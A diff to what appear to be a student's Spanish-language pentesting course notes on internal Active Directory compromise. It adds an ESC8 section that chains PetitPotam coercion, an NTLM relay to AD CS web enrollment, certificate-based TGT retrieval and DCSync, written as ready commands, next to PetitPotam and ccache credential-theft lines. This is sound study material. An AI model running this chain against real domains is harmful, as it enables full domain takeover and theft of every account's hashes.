@@ -1,4 +1,3 @@
-
 # 8. Compromiso interno
 ## D1n0 - Alejandro Maman INSO3A U-TAD
 
@@ -82,6 +81,31 @@ Fuerza una conexión desde la cuenta SYSTEM de una máquina → escalada local d
 python petitpotam.py -d <FQDN> -u <usuario> -p <password> <IP atacante> <IP objetivo>
 ```
 Fuente: https://github.com/topotam/PetitPotam/
+
+### Relay a AD CS (ESC8)
+Combina PetitPotam con un relay hacia los servicios de certificados de Active Directory (AD CS).
+Si el DC se autentica contra el servidor de certificados, se puede obtener un certificado válido
+para el DC y usarlo para solicitar un TGT → **Domain Admin sin crackear ningún hash**.
+
+Requisito: AD CS con web enrollment activo y sin protección EPA/HTTPS.
+
+```bash
+# 1. Identificar AD CS y plantillas vulnerables
+certipy find -u <usuario>@<FQDN> -p <password> -dc-ip <IP DC>
+
+# 2. Levantar ntlmrelayx apuntando al endpoint de enrollment
+impacket-ntlmrelayx -t http://<IP AD CS>/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+# 3. Forzar autenticación del DC con PetitPotam
+python petitpotam.py <IP atacante> <IP DC>
+
+# 4. Usar el certificado .pfx obtenido para autenticarse vía PKINIT y conseguir TGT
+certipy auth -pfx <DC>.pfx -dc-ip <IP DC>
+```
+
+El TGT resultante pertenece a la cuenta de máquina del DC (`DC$`), desde la que se puede
+ejecutar un DCSync para obtener todos los hashes del dominio.
 
 ### Linux Credential Cache (ccache)
 En máquinas Linux con Kerberos, los TGTs se cachean en `/tmp/krb5cc_*`. Con root se pueden extraer y convertir a `.kirbi`.
